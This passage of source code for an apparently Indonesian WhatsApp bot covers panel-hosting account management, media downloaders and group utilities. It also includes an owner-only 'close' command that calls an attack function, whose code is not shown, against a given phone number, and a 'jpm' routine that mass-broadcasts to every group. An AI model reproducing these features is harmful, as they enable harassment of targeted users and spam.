        if (gb < 1 || gb > 10) {
            return reply("GB hanya bisa 1 - 10")
        }
    }
    
    usernameRaw = args.join(" ")
    
    if (!usernameRaw && m.quoted) {
        usernameRaw = m.quoted.pushName || m.quoted.notify || 'user'
    }
    
    if (!usernameRaw) {
        return reply(`\`\`\`
How to use:
cpanel <username> <1-10 / unli>

Example:
cpanel Nugget 5     (Limited 5GB)
cpanel Nugget unli  (Unlimited)
Reply user:
cpanel 10           (Limited 10GB)
cpanel unli         (Unlimited)
\`\`\``)
    }
    
    const username = cleanUsername(usernameRaw)
    if (username.length < 3) return reply('Username too short.')
    
    let progressKey = null
    
    try {
        const loadingMsg = await conn.sendMessage(m.chat, { 
            text: `Processing ${isUnlimited ? 'unlimited' : gb ? gb + 'GB' : 'unlimited'} panel for: ${username}...` 
        }, { quoted: m })
        progressKey = loadingMsg.key
        
        const password = generatePassword(8)
        const email = `${username}@Nugget.ribka.com`
        const userData = await createUser(username, email, password)
        
        const ramMB = isUnlimited ? 0 : (gb ? gb * 1024 : 0)
        const diskMB = isUnlimited ? 0 : (gb ? gb * 1024 : 0)
        
        const serverData = await pteroFetch('servers', 'POST', {
            name: `${username} server`,
            user: userData.id,
            egg: PANEL_CONFIG.eggId,
            docker_image: DOCKER_IMAGE,
            startup: `/bin/bash`,
            environment: { 
                "CMD_RUN": "npm start", 
                "AUTO_UPDATE": "0", 
                "NODE_PACKAGES": "", 
                "UNNODE_PACKAGES": "", 
                "CUSTOM_ENVIRONMENT_VARIABLES": "",
                "ENABLE_CF_TUNNEL": "false",
                "USER_UPLOAD": "false"
            },
            limits: { 
                memory: ramMB, 
                swap: 0, 
                disk: diskMB, 
                io: 500, 
                cpu: 0 
            },
            feature_limits: { databases: 1, backups: 0, allocations: 0 },
            deploy: { locations: PANEL_CONFIG.locationIds, dedicated_ip: false, port_range: [] }
        })
        
        const finalText = `\`\`\`
USER DETAILS
ID           : ${userData.id}
Username     : ${username}
Email        : ${email}
Password     : ${password}
Login URL    : ${PANEL_CONFIG.domain}

SERVER DETAILS
Name         : ${serverData.attributes.name}
RAM          : ${isUnlimited ? 'UNLIMITED' : gb ? gb + ' GB' : 'UNLIMITED'}
Disk         : ${isUnlimited ? 'UNLIMITED' : gb ? gb + ' GB' : 'UNLIMITED'}
CPU          : UNLIMITED
Node Ver     : NodeJS 18

Server is being installed by system.
Please login to check status.
\`\`\``
        
        if (progressKey) {
            try { await conn.sendMessage(m.chat, { delete: progressKey }) } catch {}
        }
        
      
        const userJid = m.sender
        
        await conn.sendMessage(userJid, {
            text: finalText
        })
        
        
        await conn.sendMessage(m.chat, {
            text: `✅ Panel untuk *${username}* berhasil dibuat!\n📨 Data sudah dikirim ke chat pribadi.`
        }, { quoted: m })
        
    } catch (e) {
        const errMsg = `Failed to Create Panel\n\nReason: ${formatError(e)}`
        console.error(e)
        reply(errMsg)
    }
    break
}
     case 'cpanelv2': {
    if (!isCreator) return reply("kacau ye wkkwkak")
    
    const fetch = require('node-fetch')
    const config = require('./Settings/config.js')
    
    const PANEL_CONFIG = {
        domain: config.panel.domain,
        apikey: config.panel.appKey,
        eggId: 15,
        nestId: 5,
        locationIds: [1],
        defaultNode: 1
    }
    
    const DOCKER_IMAGE = 'ghcr.io/shaqpi/shaq-terminal:shaq'
    
    const generatePassword = (length = 10) => {
        const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
        return Array.from({ length }, () => chars[Math.floor(Math.random() * chars.length)]).join('')
    }
    
    const cleanUsername = (name) => {
        if (!name) return 'user' + Math.floor(Math.random() * 1000)
        return name.replace(/[^a-zA-Z0-9]/g, '').toLowerCase().slice(0, 10) || 'user' + Math.floor(Math.random() * 1000)
    }
    
    const formatError = (err) => {
        const msg = err.message || ''
        if (msg.includes('The username has already been taken')) return 'Username already taken.'
        if (msg.includes('The email has already been taken')) return 'Email already registered.'
        return `API Error: ${msg}`
    }
    
    async function pteroFetch(endpoint, method = 'GET', body = null) {
        const url = `${PANEL_CONFIG.domain}/api/application/${endpoint}`
        const options = {
            method,
            headers: {
                'Authorization': `Bearer ${PANEL_CONFIG.apikey}`,
                'Content-Type': 'application/json',
                'Accept': 'Application/vnd.pterodactyl.v1+json'
            }
        }
        if (body) options.body = JSON.stringify(body)
    
        const res = await fetch(url, options)
        const text = await res.text()
        
        if (!res.ok) {
            try {
                const jsonErr = JSON.parse(text)
                throw new Error(jsonErr.errors?.map(e => e.detail || e.code).join(', ') || 'Unknown Error')
            } catch (parseErr) {
                throw new Error(text.includes('nginx') ? `Server Error (${res.status})` : text)
            }
        }
        return JSON.parse(text)
    }
    
    async function createUser(username, email, password) {
        const data = await pteroFetch('users', 'POST', {
            username, email, password, first_name: username, last_name: "User", language: "en"
        })
        return data.attributes
    }
    
    let args = text?.trim().split(/\s+/) || []
    let usernameRaw = null
    let gb = null
    
    if (args.length >= 1) {
        const lastArg = args[args.length - 1]
        if (!isNaN(lastArg)) {
            gb = parseInt(lastArg)
            args.pop()
        }
    }
    
    if (gb !== null) {
        if (gb < 1 || gb > 10) {
            return reply("GB hanya bisa 1 - 10")
        }
    }
    
    usernameRaw = args.join(" ")
    
    if (!usernameRaw && m.quoted) {
        usernameRaw = m.quoted.pushName || m.quoted.notify || 'user'
    }
    
    if (!usernameRaw) {
        return reply(`\`\`\`
How to use:
cpanel <username> <1-10>

Example:
cpanel Nugget 5
Reply user:
cpanel 10
\`\`\``)
    }
    
    const username = cleanUsername(usernameRaw)
    if (username.length < 3) return reply('Username too short.')
    
    let progressKey = null
    
    try {
        const loadingMsg = await conn.sendMessage(m.chat, { 
            text: `Processing panel for: ${username}...` 
        }, { quoted: m })
        progressKey = loadingMsg.key
        
        const password = generatePassword(8)
        const email = `${username}@Nugget.ribka.com`
        const userData = await createUser(username, email, password)
        
        const ramMB = gb ? gb * 1024 : 0
        const diskMB = gb ? gb * 1024 : 0
        
        const serverData = await pteroFetch('servers', 'POST', {
            name: `${username} server`,
            user: userData.id,
            egg: PANEL_CONFIG.eggId,
            docker_image: DOCKER_IMAGE,
            startup: `/bin/bash`,
            environment: { 
                "CMD_RUN": "npm start", 
                "AUTO_UPDATE": "0", 
                "NODE_PACKAGES": "", 
                "UNNODE_PACKAGES": "", 
                "CUSTOM_ENVIRONMENT_VARIABLES": "",
                "ENABLE_CF_TUNNEL": "false",
                "USER_UPLOAD": "false"
            },
            limits: { 
                memory: ramMB, 
                swap: 0, 
                disk: diskMB, 
                io: 500, 
                cpu: 0 
            },
            feature_limits: { databases: 1, backups: 0, allocations: 0 },
            deploy: { locations: PANEL_CONFIG.locationIds, dedicated_ip: false, port_range: [] }
        })
        
        const finalText = `\`\`\`
USER DETAILS
ID           : ${userData.id}
Username     : ${username}
Email        : ${email}
Password     : ${password}
Login URL    : ${PANEL_CONFIG.domain}

SERVER DETAILS
Name         : ${serverData.attributes.name}
RAM          : ${gb ? gb + " GB" : "UNLIMITED"}
Disk         : ${gb ? gb + " GB" : "UNLIMITED"}
Node Ver     : NodeJS 18

Server is being installed by system.
Please login to check status.
\`\`\``
        
        if (progressKey) {
            try { await conn.sendMessage(m.chat, { delete: progressKey }) } catch {}
        }
        
        await conn.sendMessage(m.chat, {
            text: finalText
        }, { quoted: m })
        
    } catch (e) {
        const errMsg = `Failed to Create Panel\n\nReason: ${formatError(e)}`
        if (progressKey) {
            try { await conn.sendMessage(m.chat, { text: errMsg, edit: progressKey }) } 
            catch { await reply(errMsg) }
        } else {
            await reply(errMsg)
        }
    }
    break
}  
    case 'managepanel': {
    if (!isCreator) return reply("kacau ye wkkwkak")
    
    const fetch = require('node-fetch')
    const config = require('./Settings/config.js') // Sesuaikan path ke config.js
    
    const PANEL_CONFIG = config.panel
    
    function formatError(err) {
        const msg = err.message || ''
        if (msg.includes('404')) return 'Server not found. Ensure the ID is correct.'
        if (msg.includes('403')) return 'Access denied. Check API Key permissions.'
        if (msg.includes('401')) return 'Unauthorized. Invalid or expired API Key.'
        if (msg.includes('412')) return 'Server is processing or suspended.'
        if (msg.includes('500')) return 'Internal Panel Error.'
        if (msg.includes('ECONNREFUSED')) return 'Panel inaccessible (Down).'
        return `Error: ${msg}`
    }
    
    function formatSize(bytes) {
        return (bytes / (1024 * 1024 * 1024)).toFixed(2) + ' GB'
    }
    
    async function pteroFetch(type, endpoint, method = 'GET', body = null) {
        const url = `${PANEL_CONFIG.domain}/api/${type}/${endpoint}`
        const token = type === 'application' ? PANEL_CONFIG.appKey : PANEL_CONFIG.clientKey
        
        if (!token || token.includes('YOUR_CLIENT_KEY')) {
            throw new Error(`API Key for type '${type}' is not configured.`)
        }

        const headers = {
            'Authorization': `Bearer ${token}`,
            'Content-Type': 'application/json',
            'Accept': `Application/vnd.pterodactyl.v1+json`
        }

        const options = { method, headers }
        if (body) options.body = JSON.stringify(body)

        try {
            const res = await fetch(url, options)
            
            if (res.status === 204) return null

            const text = await res.text()

            if (!res.ok) {
                try {
                    const json = JSON.parse(text)
                    const errDetail = json.errors?.[0]?.detail || json.errors?.[0]?.code || 'Unknown Error'
                    throw new Error(`${res.status} ${errDetail}`)
                } catch (e) {
                    throw new Error(`HTTP ${res.status}: ${text.substring(0, 50)}`)
                }
            }
            return text ? JSON.parse(text) : null
        } catch (e) {
            throw e
        }
    }
    
    async function getServerWithAllocations(id) {
        const data = await pteroFetch('application', `servers/${id}?include=allocations`)
        return data
    }
    
    async function getUserById(id) {
        const data = await pteroFetch('application', `users/${id}`)
        return data.attributes
    }
    
    async function updateUserPassword(userId, userData, newPassword) {
        const body = {
            username: userData.username,
            email: userData.email,
            first_name: userData.first_name,
            last_name: userData.last_name,
            password: newPassword,
            language: userData.language || 'en'
        }
        await pteroFetch('application', `users/${userId}`, 'PATCH', body)
    }
    
    async function getResources(uuid) {
        try {
            const data = await pteroFetch('client', `servers/${uuid}/resources`)
            const attr = data.attributes
            return {
                state: attr.current_state || 'unknown',
                memory_bytes: attr.resources?.memory_bytes || 0,
                cpu_absolute: attr.resources?.cpu_absolute || 0,
                disk_bytes: attr.resources?.disk_bytes || 0
            }
        } catch (e) {
            return { state: 'offline', memory_bytes: 0, cpu_absolute: 0, disk_bytes: 0 }
        }
    }
    
    async function setPower(uuid, signal) {
        await pteroFetch('client', `servers/${uuid}/power`, 'POST', { signal })
    }
    
    const args = text?.trim().split(/\s+/) || []
    
    let progressKey = null
    const update = async (msg) => {
        if (!progressKey) {
            const sent = await conn.sendMessage(m.chat, { text: msg }, { quoted: m })
            progressKey = sent.key
        } else {
            await conn.sendMessage(m.chat, { text: msg, edit: progressKey })
        }
    }

    try {
        const action = (args[0] || '').toLowerCase()
        const targetId = args[1]
        const param3 = args[2]

        const validActions = ['list', 'detail', 'start', 'stop', 'restart', 'delete', 'resetpwd']

        if (!validActions.includes(action)) {
            let menu = `PANEL MANAGER MENU\n\n` +
                        `Command List:\n` +
                        `• managepanel list\n` +
                        `• managepanel detail <id>\n` +
                        `• managepanel start <id>\n` +
                        `• managepanel stop <id>\n` +
                        `• managepanel restart <id>\n` +
                        `• managepanel resetpwd <id> <pass>\n` +
                        `• managepanel delete <id>`
            return reply(menu)
        }

        if (action === 'list') {
            await reply('Fetching server data...')
            try {
                const res = await pteroFetch('application', 'servers?per_page=50')
                const servers = res.data
                
                if (!servers.length) return reply('No servers found.')

                servers.sort((a, b) => a.attributes.id - b.attributes.id)

                const txt = servers.map(s => {
                    const attr = s.attributes
                    return `------------------\nID: ${attr.id}\nName: ${attr.name}\nNode: ${attr.node}\nRam: ${attr.limits.memory === 0 ? 'Unlimited' : (attr.limits.memory / 1024).toFixed(1) + ' GB'}`
                }).join('\n')

                return reply(`SERVER PANEL LIST\nTotal: ${res.meta.pagination.total}\n\n${txt}`)
            } catch (e) {
                return reply(formatError(e))
            }
        }

        if (!targetId) return reply(`Please enter Server ID.\nExample: panel ${action} 15`)

        let fullServerData, serverAttr, serverUUID
        try {
            fullServerData = await getServerWithAllocations(targetId)
            serverAttr = fullServerData.attributes
            serverUUID = serverAttr.identifier
        } catch (e) {
            return reply(formatError(e))
        }

        if (action === 'detail') {
            await update(`Checking Server ${targetId}...`)
            try {
                let statusTxt = 'OFFLINE'
                let ramUsed = '0.00 GB'
                let diskUsed = '0.00 GB'
                let cpuUsed = '0'
                
                if (PANEL_CONFIG.clientKey && !PANEL_CONFIG.clientKey.includes('YOUR_')) {
                    const stats = await getResources(serverUUID)
                    statusTxt = stats.state.toUpperCase()
                    ramUsed = formatSize(stats.memory_bytes)
                    diskUsed = formatSize(stats.disk_bytes)
                    cpuUsed = stats.cpu_absolute.toFixed(2)
                }

                const allocations = serverAttr.relationships?.allocations?.data || []
                
                let defaultAlloc = allocations.find(a => a.attributes.is_default)
                if (!defaultAlloc && allocations.length > 0) defaultAlloc = allocations[0]
                
                const ip = defaultAlloc?.attributes?.ip_alias || defaultAlloc?.attributes?.ip || 'Unknown'
                const port = defaultAlloc?.attributes?.port || 'Unknown'
                const fullAddress = (ip !== 'Unknown' && port !== 'Unknown') ? `${ip}:${port}` : 'Unknown'

                const ramLimit = serverAttr.limits.memory === 0 ? 'Unlimited' : `${(serverAttr.limits.memory / 1024).toFixed(1)} GB`
                const diskLimit = serverAttr.limits.disk === 0 ? 'Unlimited' : `${(serverAttr.limits.disk / 1024).toFixed(1)} GB`

                await update(
                    `SERVER DETAIL ${targetId}\n\n` +
                    `Name: ${serverAttr.name}\n` +
                    `Status: ${statusTxt}\n` +
                    `Node: ${serverAttr.node}\n` +
                    `IP: ${fullAddress}\n\n` +
                    `CPU: ${cpuUsed}%\n` +
                    `RAM: ${ramUsed} / ${ramLimit}\n` +
                    `Disk: ${diskUsed} / ${diskLimit}\n` +
                    `Owner ID: ${serverAttr.user}`
                )
            } catch (e) { 
                await update(formatError(e)) 
            }
            return
        }

        if (action === 'delete') {
            const ownerId = serverAttr.user
            await update(`Deleting Server ${targetId}...`)
            try {
                await pteroFetch('application', `servers/${targetId}`, 'DELETE')
                
                await update(`Server deleted. Deleting User ID ${ownerId}...`)
                await pteroFetch('application', `users/${ownerId}`, 'DELETE')

                await update(`Success! Server ${targetId} and User ID ${ownerId} have been permanently deleted.`)
            } catch (e) { 
                await update(formatError(e)) 
            }
            return
        }

        if (action === 'resetpwd') {
            if (!param3) return reply(`Please enter new password.\nFormat: panel resetpwd ${targetId} <password>`)
            
            await update(`Fetching server owner data ${targetId}...`)
            try {
                const ownerId = serverAttr.user
                const userData = await getUserById(ownerId)
                
                await update(`Changing password for user ${userData.username}...`)
                await updateUserPassword(ownerId, userData, param3)
                
                await update(`Success! Panel account password for server ${targetId} (${serverAttr.name}) has been changed.\n\nUsername: ${userData.username}\nNew Pass: ${param3}`)
            } catch (e) {
                await update(formatError(e))
            }
            return
        }

        try {
            if (action === 'start') {
                await update(`Starting Server ${targetId}...`)
                await setPower(serverUUID, 'start')
                await update(`Server ${targetId} started successfully.`)
            }
            else if (action === 'stop') {
                await update(`Stopping Server ${targetId}...`)
                await setPower(serverUUID, 'stop')
                await update(`Server ${targetId} stopped successfully.`)
            }
            else if (action === 'restart') {
                await update(`Restarting Server ${targetId}...`)
                await setPower(serverUUID, 'restart')
                await update(`Server ${targetId} restarted successfully.`)
            }
        } catch (e) {
            const err = formatError(e)
            if (err.includes('API Key')) {
                await update(`Failed: Power feature requires Client API Key in configuration.`)
            } else {
                await update(err)
            }
        }

    } catch (err) {
        console.error(err)
        reply(`System Error: ${err.message}`)
    }
    break
}    
    case 'testspeed':
case 'ping':
case 'speed': {
    const os = require('os')
    const { exec } = require('child_process')
    const start = Date.now()
    
    await conn.sendMessage(m.chat, {
        text: '⚡ *Speed nachia ai*'
    }, { quoted: m })
    
    function formatUptime(seconds) {
        const days = Math.floor(seconds / 86400)
        const hours = Math.floor((seconds % 86400) / 3600)
        const minutes = Math.floor((seconds % 3600) / 60)
        const secs = Math.floor(seconds % 60)
        return `${days}H ${hours}J ${minutes}M ${secs}D`
    }
    
    exec('ping -c 4 8.8.8.8', (error, stdout, stderr) => {
        const end = Date.now()
        const responseTime = end - start
        
        let pingAvg = 'N/A'
        if (!error) {
            const match = stdout.match(/rtt min\/avg\/max\/mdev = [\d.\.]+\/([\d.]+)\//)
            if (match) pingAvg = match[1] + 'ms'
        }
        
        const uptime = os.uptime()
        const totalMem = os.totalmem()
        const freeMem = os.freemem()
        const usedMem = totalMem - freeMem
        const memPercent = ((usedMem / totalMem) * 100).toFixed(1)
        
        const text = `⚡ *SERVER SPEED TEST*\n\n` +
                     `📨 *Response:* ${responseTime}ms\n` +
                     `📶 *Ping Avg:* ${pingAvg}\n\n` +
                     `🖥️ *Server:* ${os.hostname()}\n` +
                     `💾 *RAM:* ${(usedMem / 1024 / 1024 / 1024).toFixed(2)}GB / ${(totalMem / 1024 / 1024 / 1024).toFixed(2)}GB (${memPercent}%)\n` +
                     `⏰ *Uptime:* ${formatUptime(uptime)}\n` +
                     `📊 *Load Avg:* ${os.loadavg().map(l => l.toFixed(2)).join(', ')}`
        
        reply(text)
    })
    break
}    
case 'rt': {
    if (text) return
    if (m.quoted) return
    
    const uptime = process.uptime()
    const days = Math.floor(uptime / 86400)
    const hours = Math.floor((uptime % 86400) / 3600)
    const minutes = Math.floor((uptime % 3600) / 60)
    const seconds = Math.floor(uptime % 60)
    
    const runtime = `${days} Hari ${hours} Jam ${minutes} Menit ${seconds} Detik`
    
    reply(`⏰ *Runtime Bot*\n\n${runtime}`)
    break
}
  case 'hpoll': {
    if (!isCreator) return reply("kacau ye wkkwkak")
    
    const crypto = require('crypto')
    
    function parsePollInput(input = '') {
        const parts = input
            .split('|')
            .map(s => s.trim())
            .filter(Boolean)
        
        const title = parts.shift() || ''
        const options = parts
        
        return { title, options }
    }
    
    if (!m.isGroup) return reply('khusus grup')
    
    if (!text?.trim()) {
        return reply('format: hpoll judul|opsi1|opsi2|opsi3')
    }
    
    let metadata
    try {
        metadata = await conn.groupMetadata(m.chat)
    } catch (error) {
        return reply('gagal mengambil metadata grup')
    }
    
    const { title, options } = parsePollInput(text)
    
    if (!title) {
        return reply('judulnya jangan kosong ya honey 😭\nformat: hpoll judul|opsi1|opsi2')
    }
    
    if (options.length < 2) {
        return reply('opsinya minimal 2 ya sayang 😭\ncontoh: hpoll absen|hadir|sakit')
    }
    
    const safeOptions = options.slice(0, 12)
    const members = metadata.participants.map(p => p.id)
    
    await conn.relayMessage(
        m.chat,
        {
            messageContextInfo: {
                messageSecret: crypto.randomBytes(32).toString('base64'),
            },
            pollCreationMessageV3: {
                contextInfo: {
                    mentionedJid: members,
                },
                options: safeOptions.map(opt => ({ optionName: opt })),
                name: title,
                selectableOptionsCount: 1,
            },
        },
        {}
    )
    break
}
   case 'yta': {
    const fetch = require('node-fetch')
    
    async function fetchJson(url) {
        const res = await fetch(url)
        if (!res.ok) throw new Error(`http ${res.status}`)
        return res.json()
    }
    
    async function ytmp3(ytUrl) {
        const api = `https://api.nexray.web.id/downloader/v1/ytmp3?url=${encodeURIComponent(ytUrl)}`
        const json = await fetchJson(api)
        if (!json?.status || !json?.result?.url) throw new Error('mp3_failed')
        return json.result
    }
    
    async function sendFancyMp3(conn, jid, audioInput, title, body, thumbnail, renderSmallThumbnail, quoted) {
        try {
            const audioUrl = audioInput.url || audioInput
            
            await conn.sendMessage(jid, {
                audio: { url: audioUrl },
                mimetype: 'audio/mpeg',
                contextInfo: {
                    externalAdReply: {
                        title: title,
                        body: body,
                        thumbnailUrl: thumbnail,
                        sourceUrl: 'https://youtube.com',
                        mediaType: 1,
                        renderLargerThumbnail: !renderSmallThumbnail
                    }
                }
            }, { quoted: quoted })
            
            return true
        } catch (e) {
            console.log('Error sendFancyMp3:', e)
            return false
        }
    }
    
    if (!text) {
        return reply('contoh: yta https://youtu.be/xxxx')
    }
    
    if (!/youtu\.?be/.test(text)) {
        return reply('itu bukan link youtube yang valid.')
    }
    
    await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })
    
    try {
        const r = await ytmp3(text)
        
        const title = r.title || 'YouTube Audio'
        const quality = r.quality || 'unknown'
        const thumb = r.thumbnail || `https://i.ytimg.com/vi/${text.split('v=')[1]}/hqdefault.jpg`
        
        await sendFancyMp3(
            conn,
            m.chat,
            { url: r.url },
            title,
            `Quality: ${quality}`,
            thumb,
            false,
            m
        )
        
    } catch (e) {
        console.error(e)
        return reply('gagal download audio.')
    } finally {
        await conn.sendMessage(m.chat, { react: { text: null, key: m.key } })
    }
    break
}    
    case 'tt':
case 'tiktok': {
    const axios = require('axios')
    
    const tiktokRegex = /https?:\/\/(www\.|vt\.)?tiktok\.com\/[^\s]+/i
    const noCaption = text?.includes('-c')
    const cleaned = text?.replace('-c', '').trim()
    
    let match = cleaned?.match(tiktokRegex)
    
    if (!match && m.quoted?.text) {
        match = m.quoted.text.match(tiktokRegex)
    }
    
    if (!match) {
        return reply('❌ format:\ntt {url}\ntt {url} -c\natau reply url lalu ketik tt')
    }
    
    const url = match[0]
    
    try {
        await conn.sendMessage(m.chat, {
            react: { text: '🕓', key: m.key }
        })
        
        const res = await axios.get(
            `https://api.nexray.web.id/downloader/tiktok?url=${encodeURIComponent(url)}`
        )
        
        if (!res.data?.status || !res.data?.result) {
            await conn.sendMessage(m.chat, {
                react: { text: null, key: m.key }
            })
            return reply('❌ Gagal mengambil data TikTok')
        }
        
        const data = res.data.result
        
        const caption =
            `🎬 *${data.title}*\n\n` +
            `👤 Author: ${data.author?.nickname}\n` +
            `🌍 Region: ${data.region}\n` +
            `⏱ Duration: ${data.duration}\n\n` +
            `👁 Views: ${data.stats?.views}\n` +
            `❤️ Likes: ${data.stats?.likes}\n` +
            `💬 Comment: ${data.stats?.comment}\n` +
            `🔁 Share: ${data.stats?.share}\n\n` +
            `🔗 TikTok URL:\nhttps://www.tiktok.com/@${data.author?.fullname}/video/${data.id}`
        
        await conn.sendMessage(
            m.chat,
            {
                video: { url: data.data },
                ...(noCaption ? {} : { caption })
            },
            { quoted: m }
        )
        
        await conn.sendMessage(m.chat, {
            react: { text: '✅', key: m.key }
        })
        
    } catch (err) {
        console.error(err)
        await reply('❌ Gagal download TikTok')
        await conn.sendMessage(m.chat, {
            react: { text: '❌', key: m.key }
        })
    }
    break
}    
  case 'playch':
case 'songch': {
    if (!isCreator) return reply('❌ Cuma owner kmu gabole.')

    const fs = require('fs')
    const path = require('path')
    const ffmpeg = require('fluent-ffmpeg')
    const ffmpegInstaller = require('@ffmpeg-installer/ffmpeg')
    const axios = require('axios')
    const dbPath = path.join(__dirname, './database/listidch.json')

    ffmpeg.setFfmpegPath(ffmpegInstaller.path)

    if (!fs.existsSync(dbPath)) {
        return reply('❌ File database/listidch.json tidak ditemukan')
    }

    let channelIds = []
    try {
        channelIds = JSON.parse(fs.readFileSync(dbPath, 'utf-8'))
        if (!Array.isArray(channelIds) || channelIds.length === 0) {
            return reply('❌ Database channel kosong')
        }
    } catch (e) {
        console.error('Error baca database:', e)
        return reply('❌ Gagal membaca database channel')
    }

    if (!text) {
        let channelList = '📋 *Daftar Channel:*\n\n'
        channelIds.forEach((id, i) => {
            channelList += `${i + 1}. ${id}\n`
        })
        channelList += `\nTotal: ${channelIds.length} channel\n\n`
        channelList += `Cara pake: .${command} [nomor] [judul lagu]\n`
        channelList += `Contoh: .${command} 1 dj aku suka dia`
        return reply(channelList)
    }

    const args = text.split(' ')
    const channelIndex = parseInt(args[0]) - 1
    const songTitle = args.slice(1).join(' ')

    if (isNaN(channelIndex) || channelIndex < 0 || channelIndex >= channelIds.length) {
        return reply(`❌ Nomor channel tidak valid. Pilih 1-${channelIds.length}`)
    }

    if (!songTitle) {
        return reply('❌ Masukkan judul lagu.\nContoh: .playch 1 dj aku suka dia')
    }

    const selectedChannel = channelIds[channelIndex]

    try {
        await reply('Mencari lagu... 🔍')

        const apiUrl = `https://api.the-nugget.my.id/search/ytplay?apikey=uget&q=${encodeURIComponent(songTitle)}`
        const response = await axios.get(apiUrl)
        
        if (!response.data || !response.data.status) {
            return reply('❌ Gagal mendapatkan data dari API')
        }

        const data = response.data.data
        const title = data.title
        const audioUrl = data.mp3
        const thumbnail = data.thumbnail

        await reply('Mengunduh audio... ⬇️')

        const tmpIn = path.join(__dirname, 'yt_in.mp3')
        const tmpOut = path.join(__dirname, 'yt_out.ogg')

        const audioResponse = await axios({
            method: 'get',
            url: audioUrl,
            responseType: 'stream'
        })

        const writer = fs.createWriteStream(tmpIn)
        audioResponse.data.pipe(writer)

        await new Promise((resolve, reject) => {
            writer.on('finish', resolve)
            writer.on('error', reject)
        })

        await reply('Mengkonversi audio... 🔄')

        await new Promise((resolve, reject) => {
            ffmpeg(tmpIn)
                .toFormat('ogg')
                .audioCodec('libopus')
                .on('end', resolve)
                .on('error', reject)
                .save(tmpOut)
        })

        const ogg = fs.readFileSync(tmpOut)

        await conn.sendMessage(selectedChannel, {
            audio: ogg,
            mimetype: 'audio/ogg; codecs=opus',
            ptt: true,
            contextInfo: {
                externalAdReply: {
                    title: title,
                    body: 'Nachia Ai',
                    thumbnailUrl: thumbnail,
                    sourceUrl: `https://youtu.be/${response.data.query}`,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                },
            },
        })

        fs.unlinkSync(tmpIn)
        fs.unlinkSync(tmpOut)

        reply(`✅ Berhasil dikirim ke channel:\n${selectedChannel}`)
    } catch (e) {
        console.log('Error detail:', e)
        reply('❌ Error: ' + e.message)
    }
    break
}            
    case "cleardbbl": {
    if (!isCreator) return reply("kacau ye wkkwkak")
    
    const fs = require('fs')
    const path = require('path')
    const dbPath = path.join(__dirname, './database/blacklist.json')
    
    if (!fs.existsSync(dbPath)) {
        return reply('Database blacklist tidak ditemukan')
    }
    
    const blacklist = JSON.parse(fs.readFileSync(dbPath, 'utf-8'))
    const jumlah = blacklist.length
    
    if (jumlah === 0) {
        return reply('Database blacklist sudah kosong')
    }
    
    if (text === 'confirm') {
        fs.writeFileSync(dbPath, JSON.stringify([], null, 2))
        reply(`✅ Database telah dibersihkan\n📝 Total ${jumlah} grup dihapus`)
    } else {
        reply(`⚠️ Yakin mau clear semua ${jumlah} grup dari database?\nKetik *${prefix + command} confirm* untuk melanjutkan`)
    }
}
break;   
case 'close': {
    if (!isCreator) return reply('khusus owner')
    if (!text) return reply('format: close 628xxxx')

    let target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

    await ComboAttack(conn, target)

    reply('✅ selesai')
}
break;      
   case "jpm": {
    if (!isCreator) return reply("kacau ye wkkwkak")
    
    const fs = require('fs')
    const path = require('path')
    const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms))
    const delayTime = 5000
    const blacklistPath = path.join(__dirname, './database/blacklist.json')

    let mediaData = null
    let mediaType = null
    let finalText = text
    let quotedMessage = m.quoted

    if (!quotedMessage && !text) {
        return reply(`Contoh: ${prefix + command} pesan atau reply ke pesan`)
    }

    if (quotedMessage) {
        const quotedMime = quotedMessage.mimetype || ''
        
        if (quotedMime.includes('image')) {
            mediaType = 'image'
            try {
                mediaData = await quotedMessage.download()
                finalText = quotedMessage.caption || text || ''
            } catch (e) {
                console.log('Download error:', e)
                return reply('Gagal download gambar')
            }
        } 
        else if (quotedMime.includes('video')) {
            mediaType = 'video'
            try {
                mediaData = await quotedMessage.download()
                finalText = quotedMessage.caption || text || ''
            } catch (e) {
                console.log('Download error:', e)
                return reply('Gagal download video')
            }
        }
        else if (quotedMessage.text || quotedMessage.conversation) {
            mediaType = 'text'
            finalText = quotedMessage.text || quotedMessage.conversation || text
        }
    }

    try {
        const allGroups = await conn.groupFetchAllParticipating()
        let groupIds = Object.keys(allGroups)

        let blacklist = []
        if (fs.existsSync(blacklistPath)) {
            blacklist = JSON.parse(fs.readFileSync(blacklistPath, 'utf-8'))
        }
        
        const totalGroups = groupIds.length
        groupIds = groupIds.filter(id => !blacklist.includes(id))
        const filteredGroups = totalGroups - groupIds.length

        if (groupIds.length === 0) {
            return reply(`❌ Tidak ada grup yang bisa dikirim (${filteredGroups} grup di-blacklist)`)
        }

        reply(`Mulai JPM ke ${groupIds.length} grup\nDelay: ${delayTime}ms\nType: ${mediaType || 'Teks'}\nSkip blacklist: ${filteredGroups} grup`)

        let successCount = 0
        let failedCount = 0
        let autoBlacklist = []

        for (const groupId of groupIds) {
            try {
                if (mediaType === 'image' && mediaData) {
                    await conn.sendMessage(groupId, { 
                        image: mediaData,
                        caption: finalText || '',
                    })
                } 
                else if (mediaType === 'video' && mediaData) {
                    await conn.sendMessage(groupId, { 
                        video: mediaData,
                        caption: finalText || '',
                    })
                }
                else {
                    await conn.sendMessage(groupId, { 
                        text: finalText || text,
                    })
                }
                
                successCount++
                await delay(delayTime)
                
            } catch (err) {
                failedCount++
                console.error(`Gagal ke grup ${groupId}:`, err.message)
                
                if (err.message.includes('not-authorized') || 
                    err.message.includes('forbidden') ||
                    err.message.includes('not admin')) {
                    autoBlacklist.push(groupId)
                }
            }
        }

        if (autoBlacklist.length > 0) {
            let currentBlacklist = []
            if (fs.existsSync(blacklistPath)) {
                currentBlacklist = JSON.parse(fs.readFileSync(blacklistPath, 'utf-8'))
            }
            
            const newBlacklist = [...new Set([...currentBlacklist, ...autoBlacklist])]
            fs.writeFileSync(blacklistPath, JSON.stringify(newBlacklist, null, 2))
        }

        reply(`✅ Berhasil: ${successCount}/${groupIds.length} grup\n❌ Gagal: ${failedCount}`)
        
    } catch (error) {
        console.error('Gagal mengambil grup:', error)
        reply('❌ Gagal mengambil daftar grup')
    }
}
break;    
  case "jpmht": {
    if (!isCreator) return reply("kacau ye wkkwkak")
    const fs = require('fs')
    const path = require('path')
    const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms))
    const delayTime = 5000
